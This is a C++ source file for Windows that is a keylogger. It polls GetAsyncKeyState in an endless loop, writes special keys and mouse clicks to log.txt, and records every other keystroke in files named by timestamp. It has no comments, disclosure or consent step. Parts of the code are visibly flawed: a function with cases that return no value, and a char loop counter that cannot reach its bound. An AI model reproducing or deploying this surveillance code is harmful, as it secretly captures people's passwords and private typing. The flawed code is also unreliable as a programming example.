#include <windows.h>
#include <iostream>
#include <cstring>
#include <cmath>
#include <vector>
#include <fstream>
#include <ctime>
#define DTTMFMT "%Y_%m_%d_%H_%M_%S"
#define DTTMSZ 21

char buff[DTTMSZ];

static char *getDtTm(char *buff){
	time_t t = time(0);
	strftime(buff,DTTMSZ,DTTMFMT,localtime(&t));
	return buff;
}

void wait(int seconds){
	clock_t endwait;
	endwait = clock() + seconds * CLOCKS_PER_SEC;
	while(clock() < endwait) {}
}

void writelogo(LPCSTR text){
	std::fstream logfile;
	logfile.open("log.txt",std::fstream::out | std::fstream::app);
	logfile<< text;
	logfile.close();
}

bool keyIslisted(int key){
	switch(key){
		case VK_SPACE:
			writelogo(" ");
			break;
		case VK_RETURN:
			writelogo("\n");
			break;
		case VK_SHIFT:
			writelogo("Shift");
			break;
		case VK_BACK:
			writelogo("\b");
			break;
		case VK_RBUTTON:
			writelogo("rclick");
			break;
		case VK_LBUTTON:
			writelogo("lclick");
			break;
		default:
			return false;

	}
}

int main(int argc, char const *argv[]){
	char key;
	char buff[DTTMSZ];
	while(true){
		for(key = 8;key<=190;key++){
			if(GetAsyncKeyState(key) == -32767){
				if(keyIslisted(key) == false){
					std::fstream filestr;
					filestr.open (getDtTm(buff),std::fstream::in | std::fstream::out | std::fstream::app);
					filestr << key;
					filestr.close();
				}
			} 
		}
	}
	return 0;
}


